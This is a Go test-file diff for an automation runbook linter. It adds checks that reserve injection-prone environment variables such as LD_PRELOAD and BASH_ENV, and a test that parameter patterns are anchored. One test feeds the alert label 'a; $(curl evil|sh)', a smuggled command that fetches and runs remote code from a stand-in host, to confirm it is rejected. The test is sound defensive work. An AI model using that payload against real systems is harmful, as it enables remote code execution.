@@ -79,6 +79,8 @@ func TestLintRules(t *testing.T) {
 		{"approval outlives run", "    - id: restart\n", "    - id: approve\n      type: approval\n      expiresAfter: 1h\n    - id: restart\n", "longer than the run timeout"},
 		{"approval with timeout", "    - id: restart\n", "    - id: approve\n      type: approval\n      timeout: 5m\n    - id: restart\n", "take expiresAfter, not timeout"},
 		{"approval count", "    - id: restart\n", "    - id: approve\n      type: approval\n      count: 11\n    - id: restart\n", "between 1 and 10"},
+		{"reserved env name", "    - id: restart\n", "    - id: sh\n      type: shell\n      env:\n        BASH_ENV: x\n      run: echo hi\n    - id: restart\n", "BASH_ENV is reserved"},
+		{"loader env name", "    - id: restart\n", "    - id: sh\n      type: shell\n      env:\n        LD_PRELOAD: x\n      run: echo hi\n    - id: restart\n", "LD_PRELOAD is reserved"},
 		{"non read-only wait", "          action: DescribeServices\n          input:\n            cluster", "          action: UpdateService\n          input:\n            cluster", "wait checks must be read-only"},
 	}
 	for _, c := range cases {
@@ -129,5 +131,35 @@ func TestResolveParams(t *testing.T) {
 	}
 	if err := ValidateParams(rb, map[string]any{"cluster": "a", "service": "b", "extra": 1}); err == nil {
 		t.Fatal("unknown param accepted")
+	}
+}
+
+func TestPatternsMatchTheWholeValue(t *testing.T) {
+	src := strings.Replace(string(load(t)), `pattern: "^[A-Za-z0-9_-]{1,255}$"`, `pattern: "[a-z]+"`, 1)
+	rb, err := Parse([]byte(src))
+	if err != nil {
+		t.Fatal(err)
+	}
+	// An unanchored pattern used to accept anything containing a match.
+	ctx := expr.Vars{"alert": map[string]any{"labels": map[string]any{"cluster": "a; $(curl evil|sh)", "service": "x"}}}
+	if _, err := ResolveParams(rb, nil, ctx); err == nil {
+		t.Fatal("unanchored pattern accepted an injection payload")
+	}
+	ctx = expr.Vars{"alert": map[string]any{"labels": map[string]any{"cluster": "prodeast", "service": "x"}}}
+	if _, err := ResolveParams(rb, nil, ctx); err != nil {
+		t.Fatalf("a whole-value match was rejected: %v", err)
+	}
+}
+
+func TestReservedEnv(t *testing.T) {
+	for _, k := range []string{"BASH_ENV", "ENV", "PATH", "IFS", "LD_PRELOAD", "BASH_FUNC_x", "DYLD_INSERT_LIBRARIES", "PS4"} {
+		if !ReservedEnv(k) {
+			t.Errorf("%s not reserved", k)
+		}
+	}
+	for _, k := range []string{"PGHOST", "AWS_REGION", "SERVICE"} {
+		if ReservedEnv(k) {
+			t.Errorf("%s reserved", k)
+		}
 	}
 }
